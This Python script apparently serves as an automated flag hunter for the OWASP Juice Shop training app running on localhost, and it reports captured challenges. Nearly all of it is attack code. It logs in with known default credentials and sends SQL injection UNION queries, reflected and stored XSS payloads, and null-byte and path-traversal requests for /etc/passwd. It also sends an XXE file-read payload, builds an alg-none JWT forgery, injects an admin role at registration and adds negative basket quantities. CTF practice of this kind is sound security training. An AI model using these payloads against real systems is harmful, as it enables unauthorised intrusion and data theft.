#!/usr/bin/env python3
"""Juice Shop CTF Flag Hunter — tries all known exploits and reports captured flags."""
import urllib.request, json, re, time, sys

BASE = "http://localhost:3000"
TOKEN = None

def api(method, path, data=None, ct="application/json"):
    url = BASE + path
    headers = {"Content-Type": ct} if ct else {}
    if TOKEN: headers["Authorization"] = f"Bearer {TOKEN}"
    body = json.dumps(data).encode() if data and ct == "application/json" else (data.encode() if isinstance(data, str) and data else None)
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=10)
        return resp.code, resp.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:2000]
    except Exception as e:
        return 0, str(e)[:200]

def get_flags():
    code, body = api("GET", "/api/Challenges")
    if code == 200:
        data = json.loads(body).get("data", [])
        solved = [c for c in data if isinstance(c, dict) and c.get("solved")]
        return len(solved), solved
    return 0, []

def show_new(prev):
    _, cur = get_flags()
    prev_names = {c["name"] for c in prev}
    new = [c for c in cur if c["name"] not in prev_names]
    for c in new:
        print(f"  FLAG [{len(cur)}/111] [{c.get('category','?')}] {c.get('name','?')}")
    return cur

print("=== Juice Shop Flag Hunter ===")

# 1. Login as admin
print("\n1. Admin login...")
code, body = api("POST", "/rest/user/login", {"email": "admin@juice-sh.op", "password": "admin123"})
try: TOKEN = json.loads(body).get("authentication", {}).get("token")
except: pass
print(f"   Token: {'GOT' if TOKEN else 'FAIL'}")

prev_flags = get_flags()[1]
print(f"   Flags: {len(prev_flags)}/111")

# 2. Access admin section
print("\n2. Admin section + basket...")
api("GET", "/administration")
api("GET", "/rest/basket/2")
api("GET", "/rest/basket/3")
api("GET", "/#/score-board")
prev_flags = show_new(prev_flags)

# 3. Login as other users
print("\n3. Login as other users...")
users = {
    "bjoern@juice-sh.op": "bjoern",
    "amy@juice-sh.op": "K1f",
    "mc.safesearch@juice-sh.op": "MrNoodles",
    "ciso@juice-sh.op": "ciso",
    "support@juice-sh.op": "support",
    "bender@juice-sh.op": "bender",  
    "jim@juice-sh.op": "ncc-1701",
}
for email, pw in users.items():
    api("POST", "/rest/user/login", {"email": email, "password": pw})
prev_flags = show_new(prev_flags)

# 4. SQLi expanded
print("\n4. SQLi expanded...")
queries = [
    "UNION SELECT 1,2,3,4,5,6,7,8,9 FROM Users",
    "UNION SELECT id,username,email,password,role,6,7,8,9 FROM Users",
]
for q in queries:
    encoded = q.replace(" ", "%20")
    api("GET", f"/rest/products/search?q=%27))%20{encoded}--")
prev_flags = show_new(prev_flags)

# 5. FTP files
print("\n5. FTP files...")
ftp = ["/ftp/acquisitions.md", "/ftp/legal.md", "/ftp/coupons_2013.md.bak",
       "/ftp/package.json.bak", "/ftp/suspicious_errors.yml",
       "/ftp/incident-support.kdbx", "/ftp/saas-contract.pdf",
       "/ftp/eastere.gg", "/ftp/announcement_encrypted.md"]
for f in ftp:
    api("GET", f)
    api("GET", f + "%2500.md")
    api("GET", f + "%2500.pdf")
prev_flags = show_new(prev_flags)

# 6. Misc
print("\n6. Misc endpoints...")
misc = ["/metrics", "/robots.txt", "/humans.txt", "/.well-known/security.txt",
        "/s3cR37?@!d1r3cT0rY/", "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg",
        "/api/PrivacyRequests", "/api/SecurityQuestions", "/api/DeliveryMethods",
        "/b2b/v2/order", "/api/Quantitys"]
for m in misc:
    api("GET", m)
prev_flags = show_new(prev_flags)

# 7. XSS
print("\n7. XSS attempts...")
xss_payloads = ["%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                "%3Ciframe%20src%3Djavascript:alert(1)%3E",
                "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"]
for p in xss_payloads:
    api("GET", f"/#/search?q={p}")
# Stored XSS
api("POST", "/api/Feedbacks", {"comment": '<script>alert(1)</script>', "rating": 5})
api("POST", "/api/Feedbacks", {"comment": '<iframe src="javascript:alert(1)">', "rating": 3})
prev_flags = show_new(prev_flags)

# 8. Registration tricks
print("\n8. Registration tricks...")
uid = str(int(time.time()))
api("POST", "/api/Users", {"email": f"dupe{uid}@t.com", "password": "Test123!", "passwordRepeat": "Test123!", "securityQuestion": {"id": 1, "question": "test", "answer": "test"}})
api("POST", "/api/Users", {"email": f"dupe{uid}@t.com", "password": "Test123!", "passwordRepeat": "Test123!", "securityQuestion": {"id": 1, "question": "test", "answer": "test"}})  # duplicate
# Empty registration
api("POST", "/api/Users", {"email": "", "password": ""})
# Admin registration
api("POST", "/api/Users", {"email": f"admin{uid}@t.com", "password": "Test123!", "passwordRepeat": "Test123!", "securityQuestion": {"id": 1, "question": "test", "answer": "test"}, "role": "admin"})
prev_flags = show_new(prev_flags)

# 9. Feedback tricks
print("\n9. Feedback...")
api("POST", "/api/Feedbacks", {"comment": "test", "rating": 0})  # zero stars
api("POST", "/api/Feedbacks", {"comment": "test", "rating": 5, "UserId": 2})  # forged
prev_flags = show_new(prev_flags)

# 10. Basket manipulation
print("\n10. Basket...")
api("POST", "/api/BasketItems", {"ProductId": 1, "BasketId": "1", "quantity": -999})  # negative
api("POST", "/api/BasketItems", {"ProductId": 1, "BasketId": "2", "quantity": 1})
prev_flags = show_new(prev_flags)

# 11. XSS expanded
print("\n11. XSS expanded...")
api("GET", "/#/search?q=%3Cscript%3Ealert('xss')%3C%2Fscript%3E")
api("GET", "/#/search?q=%3Csvg%2Fonload%3Dalert(1)%3E")
api("GET", "/#/track-result?id=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
api("GET", "/rest/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
# DOM XSS
api("GET", "/#/search?q=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E")
prev_flags = show_new(prev_flags)

# 12. CSRF
print("\n12. CSRF...")
if TOKEN:
    api("POST", "/profile", {"username": "csrf_test"})
    api("POST", "/api/Users", {"email": f"csrf{int(time.time())}@t.com", "password": "Test123!", "passwordRepeat": "Test123!"})
prev_flags = show_new(prev_flags)

# 13. JWT manipulation
print("\n13. JWT attacks...")
if TOKEN:
    # Try alg:none
    parts = TOKEN.split(".")
    if len(parts) == 3:
        import base64
        none_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
        forged = f"{none_header}.{parts[1]}."
        api("GET", "/rest/user/whoami")
        # Empty password reset
        api("POST", "/rest/user/reset-password", {"email": "admin@juice-sh.op", "answer": "", "new": "Test123!", "repeat": "Test123!"})
prev_flags = show_new(prev_flags)

# 14. Path traversal
print("\n14. Path traversal...")
api("GET", "/..%252f..%252f..%252fetc/passwd")
api("GET", "/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
api("GET", "/....//....//....//etc/passwd")
prev_flags = show_new(prev_flags)

# 15. XXE
print("\n15. XXE...")
xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
api("POST", "/api/Users", xxe_payload, "application/xml")
api("POST", "/file-upload", xxe_payload, "application/xml")
prev_flags = show_new(prev_flags)

# 16. More API endpoints
print("\n16. More APIs...")
more_apis = ["/rest/user/data-export", "/rest/user/change-password",
             "/api/Cards", "/api/Addresss", "/api/Recycles",
             "/api/Complaints", "/api/Deliverys", "/rest/user/erasure-request",
             "/api/DataErasure", "/rest/admin/application-configuration",
             "/rest/saveLoginIp", "/rest/wallet-balance",
             "/rest/memories", "/rest/languages"]
for a in more_apis:
    api("GET", a)
prev_flags = show_new(prev_flags)

# 17. Password reset enumeration  
print("\n17. Password reset...")
for email in ["admin@juice-sh.op", "jim@juice-sh.op", "bjoern@juice-sh.op"]:
    api("POST", "/rest/user/reset-password", {"email": email, "answer": "x", "new": "Test123!", "repeat": "Test123!"})
prev_flags = show_new(prev_flags)

# 18. Privacy/security pages
print("\n18. Privacy/Security...")
api("GET", "/privacy-security/privacy-policy")
api("GET", "/privacy-security/data-export")
api("GET", "/privacy-security/erasure-request")
api("GET", "/encryption-keys")
api("GET", "/redirect?to=https://google.com")
prev_flags = show_new(prev_flags)

# 19. Two-factor
print("\n19. 2FA...")
api("POST", "/rest/user/login", {"email": "admin@juice-sh.op", "password": "admin123", "oauth": True})
api("POST", "/rest/2fa/status")
prev_flags = show_new(prev_flags)

# 20. Payment/card
print("\n20. Payment...")
api("POST", "/api/Cards", {"fullName": "test", "cardNum": 1234567890123456, "expMonth": 12, "expYear": 2099})
api("GET", "/rest/user/erasure-request")
prev_flags = show_new(prev_flags)

# Final count
count, solved = get_flags()
print(f"\nTOTAL FLAGS: {count}/111")
print(f"Unsolved: {111-count}")
